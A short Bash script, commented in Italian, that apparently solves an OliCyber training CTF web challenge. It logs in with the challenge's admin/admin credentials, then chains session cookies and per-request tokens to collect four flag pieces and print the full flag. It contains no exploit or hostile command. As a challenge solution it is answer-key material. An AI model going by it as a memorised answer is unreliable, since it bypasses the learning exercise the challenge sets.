#!/bin/bash

BASE_URL="http://web-11.challs.olicyber.it"
COOKIE_FILE="cookies.txt"

# 1. Login e recupero del primo Token
echo "[*] Eseguendo il Login..."
RESPONSE=$(curl -s -c $COOKIE_FILE -X POST "$BASE_URL/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "admin"}')

# Estraiamo il token dal JSON di risposta usando jq
TOKEN=$(echo $RESPONSE | jq -r '.token')
echo "[+] Login effettuato. Primo Token: $TOKEN"

FLAG=""

# 2. Ciclo per recuperare i 4 pezzi della flag (index 0, 1, 2, 3)
for i in {0..3}
do
    echo "[*] Recupero pezzo indice $i..."
    
    # Effettuiamo la richiesta passando l'indice e il token corrente
    # Usiamo -b per inviare i cookie salvati in precedenza
    RES=$(curl -s -b $COOKIE_FILE "$BASE_URL/flag_piece?index=$i&token=$TOKEN")
    
    # Estraiamo il pezzo di flag e il NUOVO token per la prossima richiesta
    PIECE=$(echo $RES | jq -r '.piece')
    TOKEN=$(echo $RES | jq -r '.token')
    
    FLAG="${FLAG}${PIECE}"
    echo "[+] Pezzo ottenuto: $PIECE | Nuovo Token: $TOKEN"
done

echo -e "\n[!!!] FLAG COMPLETA: $FLAG"

# Pulizia
rm $COOKIE_FILE
